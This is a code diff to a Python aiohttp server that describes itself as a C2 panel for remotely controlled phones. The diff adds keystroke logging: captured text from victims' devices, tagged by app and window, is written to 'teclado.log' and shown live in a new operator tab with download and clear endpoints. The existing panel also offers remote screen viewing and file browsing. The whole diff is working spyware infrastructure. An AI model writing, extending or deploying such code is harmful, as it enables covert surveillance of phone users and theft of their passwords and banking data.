@@ -1,11 +1,26 @@
 # server.py - C2 local, porta unica 8080 (v2)
-import asyncio, json, socket
+import asyncio, json, os, socket, time
 from aiohttp import web, WSMsgType
 
 TOKEN = "3f7cm0ygvhr5w8"
 DEVS = {}
 VIEW = {}
 BUSY = set()
+KF = "teclado.log"
+
+def klog(dev, pkg, win, txt):
+    try:
+        if os.path.exists(KF) and os.path.getsize(KF) > 3000000:
+            with open(KF, encoding="utf-8", errors="replace") as f:
+                cauda = f.read()[-1000000:]
+            with open(KF, "w", encoding="utf-8") as f:
+                f.write(cauda)
+        with open(KF, "a", encoding="utf-8") as f:
+            f.write("%s\t%s\t%s\t%s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), dev or "?",
+                                          (pkg or "?") + ("/" + win if win else ""),
+                                          (txt or "").replace("\n", "\\n")))
+    except Exception:
+        pass
 
 def devlist():
     return [{"id": k, "m": v["i"].get("m", "?"), "bat": v["i"].get("bat", -1),
@@ -41,6 +56,9 @@ input{flex:1;cursor:text}
 .row:hover{background:#161c23}
 .row.edit{border-left:2px solid #3fb950;padding-left:5px}
 .row.money span:first-child{color:#3fb950;font-weight:600;font-size:13px}
+#klist{font:11px monospace;white-space:pre-wrap;word-break:break-all}
+.kh{color:#58a6ff;margin:6px 0 2px;border-bottom:1px solid #1a2028;padding-bottom:2px}
+.krow{padding:1px 0;color:#c9d1d9}.krow b{color:#8b949e;font-weight:400}
 .tap{position:fixed;width:20px;height:20px;margin:-10px 0 0 -10px;border:2px solid #58a6ff;border-radius:50%;pointer-events:none;animation:f .42s ease-out forwards}
 @keyframes f{to{transform:scale(1.7);opacity:0}}
 </style>
@@ -60,10 +78,15 @@ input{flex:1;cursor:text}
 </header>
 <main><div id=wrap><img id=scr><div id=st></div></div>
 <aside>
-<div id=tabs><b class=on data-t=log>log</b><b data-t=txt>texto</b><b data-t=arq>arquivos</b><b data-t=apps>apps</b><b data-t=info>info</b></div>
+<div id=tabs><b class=on data-t=log>log</b><b data-t=txt>texto</b><b data-t=tecla>tecla</b><b data-t=arq>arquivos</b><b data-t=apps>apps</b><b data-t=info>info</b></div>
 <div id=body>
 <div id=arqbar style="display:none"><div class=ln><input id=p value="/sdcard"><button onclick="ls()">ir</button></div><div id=flist></div></div>
 <div id=tlist style="display:none"></div>
+<div id=kbar style="display:none"><div class=ln><span class=sm>gravando no teclado.log</span>
+<button onclick="kpause=!kpause;this.textContent=kpause?'retomar':'pausar'">pausar</button>
+<button onclick="fetch('/keys/clear?t='+T)">limpar</button>
+<button onclick="location.href='/keys/dl?t='+T">baixar</button></div></div>
+<div id=klist style="display:none"></div>
 <pre id=out></pre>
 </div>
 <div style="padding:5px;border-top:1px solid #232b35">
@@ -78,7 +101,7 @@ input{flex:1;cursor:text}
 <script>
 const T=new URLSearchParams(location.search).get('t')||'';
 const $=s=>document.querySelector(s),i=$('#scr'),dev=$('#dev'),st=$('#st'),dot=$('#dot'),lat=$('#lat'),out=$('#out');
-let w,sel='',inf={w:0,h:0},lf=0,tp=0,recs=null,tabNow='log',pasta='/sdcard',pend=null,tmr=null;
+let w,sel='',inf={w:0,h:0},lf=0,tp=0,recs=null,tabNow='log',pasta='/sdcard',pend=null,tmr=null,kt=null,kpause=false,kn=0;
 const log=x=>{out.textContent+=x+'\n';out.scrollTop=out.scrollHeight};
 function co(){
   w=new WebSocket((location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/panel?t='+T);
@@ -106,6 +129,7 @@ function co(){
       else if(x.t==='ls'){lista(x.o)}
       else if(x.t==='dl'){baixa(x.o)}
       else if(x.t==='tree'){if(tabNow==='txt')renderTree(x.o)}
+      else if(x.t==='k'){if(tabNow==='tecla'&&!kpause)kcarrega()}
       else if(x.t==='info'&&tabNow==='info'){out.textContent=x.o}
       else log(x.t+': '+(x.o||''))}
   };
@@ -171,7 +195,25 @@ function tab(n){tabNow=n;
   out.style.display=(n==='arq'||n==='txt')?'none':'block';
   clearInterval(tmr);
   if(n==='txt'){c('tree');tmr=setInterval(()=>{if(tabNow==='txt')c('tree')},1300)}
+  if(n==='tecla'){kcarrega();kt=setInterval(kcarrega,2000)}
   if(n==='apps')c('apps');if(n==='arq')ls();if(n==='info')c('info')}
+function kdesenha(linhas){
+  const f=$('#klist');f.innerHTML='';
+  let ultimo='';
+  linhas.forEach(l=>{
+    const p=l.split('\t'), cab=p[2]||'?';
+    if(cab!==ultimo){ultimo=cab;const h=document.createElement('div');
+      h.className='kh';h.textContent='-- '+cab+' --';f.appendChild(h)}
+    const d=document.createElement('div');d.className='krow';
+    const b=document.createElement('b');b.textContent=(p[0]||'').slice(11)+'  ';
+    d.appendChild(b);d.appendChild(document.createTextNode(p[3]||''));
+    f.appendChild(d)});
+  f.scrollTop=f.scrollHeight}
+function kcarrega(){
+  if(kpause)return;
+  fetch('/keys?t='+T+'&n=600'+(sel?'&dev='+encodeURIComponent(sel):''))
+    .then(r=>r.json()).then(j=>{if(j.l.length===kn&&tabNow==='tecla')return;
+      kn=j.l.length;kdesenha(j.l)}).catch(()=>{})}
 function renderTree(a){
   const f=$('#tlist');f.innerHTML='';
   if(!a||!a.length){const v=document.createElement('div');v.className='sm';
@@ -269,6 +311,11 @@ async def phone(req):
                     try: await ws.send_str('{"c":"ka"}')
                     except Exception: pass
                     continue
+                elif o.get("t") == "k":
+                    klog(dev, o.get("pkg"), o.get("win"), o.get("o", ""))
+                    await bcast({"k": "key", "d": {"id": dev, "pkg": o.get("pkg"),
+                                                   "win": o.get("win"), "o": o.get("o", "")}})
+                    continue
                 await bcast({"k": "log", "d": o}, dev)
     except Exception as e:
         print("  ! erro em %s: %s" % (dev, e))
@@ -310,6 +357,29 @@ async def panel(req):
     finally: VIEW.pop(ws, None)
     return ws
 
+async def keys_get(req):
+    if not ok(req): raise web.HTTPForbidden(text="token invalido")
+    try: n = min(int(req.query.get("n", 400)), 2000)
+    except Exception: n = 400
+    dev = req.query.get("dev")
+    linhas = []
+    if os.path.exists(KF):
+        with open(KF, encoding="utf-8", errors="replace") as f:
+            for l in f:
+                if dev and ("\t" + dev + "\t") not in l: continue
+                linhas.append(l.rstrip("\n"))
+    return web.json_response({"l": linhas[-n:]})
+
+async def keys_clear(req):
+    if not ok(req): raise web.HTTPForbidden(text="token invalido")
+    open(KF, "w", encoding="utf-8").close()
+    return web.json_response({"ok": True})
+
+async def keys_dl(req):
+    if not ok(req): raise web.HTTPForbidden(text="token invalido")
+    if not os.path.exists(KF): open(KF, "w", encoding="utf-8").close()
+    return web.FileResponse(KF, headers={"Content-Disposition": 'attachment; filename="teclado.log"'})
+
 async def health(req):
     return web.json_response({"ok": True, "devices": devlist()})
 
@@ -345,6 +415,9 @@ def main():
     app.router.add_get("/ws", phone)
     app.router.add_get("/panel", panel)
     app.router.add_get("/health", health)
+    app.router.add_get("/keys", keys_get)
+    app.router.add_get("/keys/clear", keys_clear)
+    app.router.add_get("/keys/dl", keys_dl)
     app.on_startup.append(on_start)
     print("painel: http://localhost:8080/")
     web.run_app(app, host="0.0.0.0", port=8080, print=None, access_log=None)
